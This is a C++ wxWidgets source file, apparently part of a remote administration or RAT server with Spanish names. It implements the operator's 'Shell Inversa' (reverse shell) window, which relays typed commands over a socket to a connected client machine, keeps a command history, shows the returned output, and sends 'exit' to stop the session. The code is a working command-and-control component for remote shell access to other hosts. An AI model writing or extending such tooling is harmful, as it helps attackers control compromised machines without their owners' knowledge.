#include "panel_reverse_shell.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

//Custom event
wxDEFINE_EVENT(ADD_SHELL_OUTPUT, wxCommandEvent);

wxBEGIN_EVENT_TABLE(panelReverseShell, wxFrame)
    EVT_BUTTON(wxID_ANY, panelReverseShell::OnButton)
wxEND_EVENT_TABLE()


//Reverse Shell
panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck, std::string _strID) :
    wxFrame(pParent, EnumIDS::ID_Panel_Reverse_Shell, "Shell Inversa", wxDefaultPosition, wxSize(700, 400)) {

    this->sckCliente = sck;
    this->SetTitle("[" + _strID.substr(0, _strID.find('/', 0)) + "] Shell Inversa");
    
    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_RICH);
    if (this->txtConsole == nullptr) {
        DEBUG_MSG("No se pudo iniciar el txtConsole");
    }
    this->txtConsole->SetForegroundColour(*wxWHITE);
    this->txtConsole->SetBackgroundColour(*wxBLACK);

    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
    wxBoxSizer* sizer_controls = new wxBoxSizer(wxHORIZONTAL);
    
    sizer_controls->Add(new wxButton(this, EnumReverseShell::BTN_Start, "Iniciar", wxDefaultPosition, wxDefaultSize), 0);
    sizer_controls->Add(new wxButton(this, EnumReverseShell::BTN_Stop, "Detener", wxDefaultPosition, wxDefaultSize), 0);

    main_sizer->Add(sizer_controls, 0);
    main_sizer->Add(this->txtConsole, 1, wxEXPAND | wxALL);
    
    this->SetSizer(main_sizer);

    Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
    Bind(ADD_SHELL_OUTPUT, &panelReverseShell::OnAgregarTexto, this);
    //p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);
}

void panelReverseShell::OnHook(wxKeyEvent& event) {
    if (this->txtConsole == nullptr) {
        event.Skip();
        return;
    }
    //long last_position = this->txtConsole->GetLastPosition();
    unsigned long int current_pos = this->txtConsole->GetInsertionPoint();
    int iCode = event.GetKeyCode();
    if (iCode == WXK_LEFT || iCode == WXK_BACK) {
        //Si retrocedio hasta el ultimo regresarlo
        if (current_pos <= this->p_uliUltimo) {
            this->txtConsole->SetInsertionPoint(this->p_uliUltimo);
        }
        else {
            event.Skip();
        }
    }
    else if (iCode == WXK_UP) {
        //Historial de comandos?
        if (this->vc_History.size() > 0) {
            if (this->iHistorialPos > 0) {
                this->iHistorialPos--;
            }
            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
            wxString strTmp = this->vc_History[this->iHistorialPos];
            this->txtConsole->AppendText(strTmp);
            //std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
        }
    }
    else if (iCode == WXK_DOWN) {
        if (this->vc_History.size() > 0) {
            if (this->iHistorialPos + 1 < this->vc_History.size()) {
                this->iHistorialPos++;
            }
            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
            wxString strTmp = this->vc_History[this->iHistorialPos];
            this->txtConsole->AppendText(strTmp);
            //std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;

        }

    }
    else if (iCode == WXK_RETURN) {
        wxString strCmdLine = this->txtConsole->GetRange(this->p_uliUltimo, this->txtConsole->GetLastPosition());
        this->vc_History.push_back(strCmdLine);

        wxString str1 = strCmdLine;
        str1.append(1, '\r');
        str1.append(1, '\n');

        p_Servidor->cChunkSend(this->sckCliente, str1.c_str(), str1.size(), 0, false, EnumComandos::Reverse_Shell_Command);

        this->p_uliUltimo = this->txtConsole->GetLastPosition() + 1;
        event.Skip();
    }
    else {
        if (this->txtConsole->GetInsertionPoint() < this->txtConsole->GetLastPosition()) {
            this->txtConsole->SetInsertionPointEnd();
        }
        event.Skip();
    }
}

void panelReverseShell::OnAgregarTexto(wxCommandEvent& event) {
    if (this->txtConsole) {
        this->txtConsole->AppendText(event.GetString());
        this->p_uliUltimo = this->txtConsole->GetLastPosition();
    }
}

void panelReverseShell::EscribirSalida(const char* pBuffer) {
    wxString strData(pBuffer);
    
    wxCommandEvent evento(ADD_SHELL_OUTPUT, GetId());

    evento.SetString(pBuffer);

    wxPostEvent(this, evento);
}

void panelReverseShell::OnButton(wxCommandEvent& event) {
    const int btnID = event.GetId();
    int iComando = 0;
    std::string strCommand = "";
    switch (btnID) {
        case EnumReverseShell::BTN_Start:
            iComando = EnumComandos::Reverse_Shell_Start;
            strCommand = DUMMY_PARAM;
            break;
        case EnumReverseShell::BTN_Stop:
            iComando = EnumComandos::Reverse_Shell_Command;
            strCommand = "exit\r\n";
            break;
        default:
            iComando = EnumComandos::Reverse_Shell_Command;
            strCommand = "exit\r\n";
            break;
    }

    p_Servidor->cChunkSend(this->sckCliente, strCommand.c_str(), strCommand.size(), 0, false, iComando);

}